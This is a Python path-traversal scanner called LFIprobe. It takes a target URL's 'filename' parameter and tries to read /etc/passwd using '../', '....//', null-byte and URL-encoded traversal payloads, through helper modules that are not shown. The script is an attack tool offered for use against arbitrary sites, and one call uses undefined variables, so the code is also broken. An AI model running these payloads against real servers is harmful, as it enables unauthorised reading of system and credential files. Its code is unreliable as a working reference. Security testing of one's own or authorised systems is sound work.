import re
import time
import argparse
import urllib.request
import requests
import urllib.parse
import sys
import os
import encr
import nort
try:
    print("""
██╗     ███████╗██╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
██║     ██╔════╝██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
██║     █████╗  ██║██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
██║     ██╔══╝  ██║██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
███████╗██║     ██║██║     ██║  ██║╚██████╔╝██████╔╝███████╗
╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
""")                                                           
    print("\033[31;5mLFIprobe V1.0\033[0m")
    print("\033[31;5mby Anubhab Mukherjee\033[0m")

    parser = argparse.ArgumentParser(description='to start scan on a url: python lfiprobe.py -u your_target_url')
    parser.add_argument('-u', '--url', required=True, help='The target')
    parser.add_argument("--time-sec", type=int, default=0,
                        help="Wait for the provided time-sec before every request")
    args = parser.parse_args()
    url_regex = re.compile(r'^https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+')
    if not url_regex.match(args.url):
        print('\033[93m[WARNING]\033[0m'+f'Error: {args.url} is not a valid URL please enter a vaild url[example:https://example.com/img?filename=xyz.jpg]')
    else:
        if '?' in args.url and '=' in args.url:
            fex = os.path.splitext(args.url)[1]
            path_parts = args.url.split('?')
            query_string = path_parts[1]
            query_parts = query_string.split('=')
            if query_parts[0] == 'filename':
                filename = query_parts[1]
                last_slash_index = filename.rfind('/')
                if last_slash_index != -1:
                    di = filename[:last_slash_index]

            url_parts = args.url.split('=')
            url = url_parts[0] + '='
            print("\033[32m[INFO]Started Testing on URL:" +url+ "\033[0m")
            if 'di' in locals():
                payload = "/etc/passwd"
                tmp="/.."
                if nort.check_ad(di,url,payload,tmp,args.time_sec):
                    exit(1)
                if encr.urenc_ad(di,url,payload,tmp,args.time_sec):
                    exit(1)
            payload = "/etc/passwd"
            null_payload = "/etc/passwd%00"+fex
            tmp="../"
            tmp1=".."
            if nort.check(url,payload,tmp,tmp1,args.time_sec):
                exit(1)
            if encr.urenc(url,payload,tmp,tmp1,args.time_sec):
                exit(1)
            if nort.check(url,null_payload,tmp,tmp1,args.time_sec):
                exit(1)
            if encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
                exit(1)
            payload = "//etc/passwd"
            tmp="....//"
            tmp1="...."
            if nort.check(url,payload,tmp,tmp1,args.time_sec):
                exit(1)
            if encr.urenc(url,payload_or,tmp_or,tmp1_or,args.time_sec):
                exit(1)
            if nort.check(url,null_payload,tmp,tmp1,args.time_sec):
                exit(1)
            if encr.urenc(url,null_payload,tmp,tmp1,args.time_sec):
                exit(1)
            print("[-]Unable to find the travarse path")
           
        else:
            print('\033[93m[WARNING]\033[0m'+f'{args.url} please enter correct format[example:https://example.com/img?filename=xyz.jpg]')
except KeyboardInterrupt:
    print("\033[31;5m[ERROR]\033[0m"+"Keyboard Interruption")
    
        